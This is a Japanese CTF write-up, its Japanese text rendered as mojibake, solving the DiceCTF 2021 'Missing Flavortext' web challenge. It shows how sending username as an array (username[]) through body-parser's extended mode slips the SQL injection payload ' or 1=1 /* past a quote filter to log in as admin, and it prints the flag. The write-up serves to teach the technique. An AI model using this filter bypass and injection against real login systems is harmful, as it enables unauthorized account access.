---
title: "DiceCTF 2021 - Missing Flavortext"
emoji: "ğŸŒŠ"
type: "tech" # tech: æŠ€è¡“è¨˜äº‹ / idea: ã‚¢ã‚¤ãƒ‡ã‚¢
topics: ["CTF", "Web", "easy"]
published: true
---

## å•é¡Œæ¦‚è¦
> Hmm, it looks like there's no flavortext here. Can you try and find it?
> [missing-flavortext.dicec.tf](https://missing-flavortext.dicec.tf/)
> Downloads
> [index.js](https://dicegang.storage.googleapis.com/uploads/93b69e65a6c5be22a9910caaacd36da72733f475031f96e0082d3c6bf76e77de/index.js)

é–‹ãã¨ãƒ­ã‚°ã‚¤ãƒ³ç”»é¢ã«ãªã£ã¦ãŠã‚Šã€SQL Injectionã®å•é¡Œã§ã‚ã‚‹ã“ã¨ã¯å®¹æ˜“ã«æƒ³åƒãŒã¤ãã¾ã™ã€‚ä½¿ç”¨ã—ã¦ã„ã‚‹ã®ã¯SQLite3ã€‚username=adminã€password=(ãƒ©ãƒ³ãƒ€ãƒ ãªæ–‡å­—åˆ—)ã§ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹ã“ã¨ãŒç›®çš„ã§ã™ã€‚

## è§£èª¬
### åˆ¶ç´„
`index.js`ã‚’è¦‹ã‚‹ã¨åˆ†ã‹ã‚‹ã®ã§ã™ãŒã€ä»¥ä¸‹ã®åˆ¶ç´„ãŒã‚ã‚Šã¾ã™ã€‚

- `username`ã€`password`ã¯ç©ºã§ã¯ã„ã‘ãªã„
:::message
SQLite3ã®ä»•æ§˜ã§ã€`''`ã¯ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã•ã‚Œã¦`'`ã¨ã—ã¦æ‰±ã‚ã‚Œã‚‹ã“ã¨ã‚’å«Œã£ã¦ã„ãã†ã§ã™
:::
- `username`ã€`password`ã«`'`ãŒå«ã¾ã‚Œã¦ã¯ã„ã‘ãªã„
- ã‚¯ã‚¨ãƒªã¯è¤‡æ•°è¡Œä½¿ç”¨ã—ã¦ã„ã‚‹ã®ã§ã€ã‚³ãƒ¡ãƒ³ãƒˆã‚¢ã‚¦ãƒˆã™ã‚‹ãªã‚‰`/*`ã‚’ä½¿ã†

ã“ã®ã“ã¨ã‹ã‚‰ã€æƒ³å®šå‡ºæ¥ã‚‹è§£ãæ–¹ã¯å¤§ãã2é€šã‚Šã§ã™ã€‚

- åˆ¶ç´„ã®2ã¤ã‚ã‚’é ‘å¼µã£ã¦çªç ´ã—ã€`username=' or 1=1 /*`ç­‰ã¨ã—ã¦è§£ã
- ãƒãƒ«ãƒãƒã‚¤ãƒˆã‚’åˆ©ç”¨ã—ã¦usernameã®å¾Œã‚ã«ã‚ã‚‹`'`ã‚’åˆ¥ã®æ–‡å­—ã¨ã—ã¦èªè­˜ã•ã›ã‚‹

2ã¤ç›®ã¯UTF-8ã¨ã®ã“ã¨ãªã®ã§é›£ã—ãã†ã§ã™ã€‚ã¨ã„ã†ã“ã¨ã§1ã¤ç›®ã®æ‰‹æ³•ã§ã€ã©ã“ã‹ã«ç©´ãŒã‚ã‚‹ã¯ãš...ï¼

### body-parserã«ãŠã‘ã‚‹ç½ 
ã•ã‚Šã’ãªã`index.js`ã«æ›¸ã‹ã‚Œã¦ã„ã‚‹ã“ã®1æ–‡ãŒä»Šå›ã®éµã§ã™ã€‚

```js
app.use(bodyParser.urlencoded({ extended: true }));
```

ã“ã“ã®`extended: true`ãªã‚“ã§ã™ãŒã€[å…¬å¼ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ](https://github.com/expressjs/body-parser#bodyparserurlencodedoptions)ã‚’å‚ç…§ã™ã‚‹ã¨ä»¥ä¸‹ã®ã‚ˆã†ãªä»•æ§˜ãŒåˆ†ã‹ã‚Šã¾ã™ã€‚

> A new body object containing the parsed data is populated on the request object after the middleware (i.e. req.body). This object will contain key-value pairs, where the value can be a string or array (when extended is false), or any type (when extended is true).

ã¤ã¾ã‚Šã€`extended: true`ã«ã‚ˆã‚Š`username`ã¨`password`ã¯é…åˆ—ã¨ã—ã¦ã‚‚é€ã‚‹ã“ã¨ãŒå‡ºæ¥ã¾ã™ã€‚ä¾‹ãˆã°ã€`username=["admin?' or 1=1 /*]`ã¨ã—ã¦é€ä¿¡ã™ã‚‹ã¨ã€ä»¥ä¸‹ã®ã‚ˆã†ãªæŒ™å‹•ã‚’ã—ã¾ã™ã€‚

1. æ™®é€šã«åˆ¶ç´„2ã¤ç›®ã®`'`ç¦æ­¢ã¯é€šéå¯èƒ½ã€‚usernameã¯é…åˆ—ãªã®ã§ã€ãã®1è¦ç´ ã¨ã—ã¦`"'"`ãŒå«ã¾ã‚Œãªã„ãŸã‚ã€‚
2. ã‚¯ã‚¨ãƒªã«é–¢ã—ã¦ã¯ã€1è¦ç´ ã®é…åˆ—ãªã®ã§æ™®é€šã®æ–‡å­—åˆ—ã¨åŒç­‰ã®æ‰±ã„ã‚’å—ã‘ã¦`username = 'admin?' or 1=1 /*' and password...`ã¨ã„ã£ãŸã‚¯ã‚¨ãƒªãŒä½œã‚‰ã‚Œã‚‹
3. çµæœã€SQL InjectionãŒæˆåŠŸã—ã¦å”¯ä¸€ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã§ã‚ã‚‹adminã¨ã—ã¦ã®ãƒ­ã‚°ã‚¤ãƒ³ã«æˆåŠŸ

Chromeæ‹¡å¼µã§ã‚ã‚‹ã€ŒAdvanced REST Clientã€ã‚’ç”¨ã„ã¦ä»¥ä¸‹ã®ã‚ˆã†ã«ã‚¯ã‚¨ãƒªã‚’é€ã‚‹ã¨ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãŒæ¥ã¾ã™ã€‚

- POST: https://missing-flavortext.dicec.tf/login
- username[] = `' or 1=1 /*`
- password = `pass`


```
<!doctype html>
<html>
    <head>
        <link rel="stylesheet" href="/styles.css">
    </head>
    <body>
        <div>
            <p>Looks like there was no flavortext here either :(</p>
            <p>Here's your flag?</p>
            <p>dice{sq1i_d03sn7_3v3n_3x1s7_4nym0r3}</p>
        </div>
    </body>
</html>
```
